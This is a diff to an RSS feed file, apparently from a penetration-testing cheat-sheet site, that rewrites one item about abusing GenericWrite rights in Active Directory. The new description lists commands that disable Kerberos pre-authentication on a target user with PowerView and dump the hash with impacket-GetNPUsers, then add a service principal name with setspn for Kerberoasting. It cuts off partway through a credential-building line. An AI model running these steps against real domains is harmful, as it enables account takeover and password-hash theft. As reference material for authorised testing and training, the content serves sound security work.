@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/genericwrite/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/genericwrite/</guid>
-      <description> Using PowerView.ps1 . .\PowerView.ps1 Add UF_DONT_REQUIRE_PREAUTH bit # Check target user Get-DomainUser user | ConvertFrom-UACValue Set-DomainObject -Identity user -XOR @{useraccountcontrol=4194304} -Verbose Get hash # In local linux machine impacket-GetNPUsers example.com/user -no-pass -dc-ip 10.10.11.10 </description>
+      <description>Import PowerView.ps1 . .\PowerView.ps1 Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit # Check target user Get-DomainUser &amp;lt;target_user&amp;gt; | ConvertFrom-UACValue # Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity &amp;lt;target_user&amp;gt; -XOR @{useraccountcontrol=4194304} -Verbose Get hash # In local linux machine impacket-GetNPUsers example.com/user -no-pass -dc-ip 10.10.11.10 Abuse #2 : Kerberoasting by adding spn Add spn # Add spn setspn -a MSSQLSvc/example.com:1433 example.com\target_user # Check Get-DomainUser target_user | Select serviceprincipalname Runas $password = ConvertTo-SecureString &amp;#39;password&amp;#39; -AsPlainText -Force $cred = New-Object System.</description>
     </item>
   </channel>
 </rss>
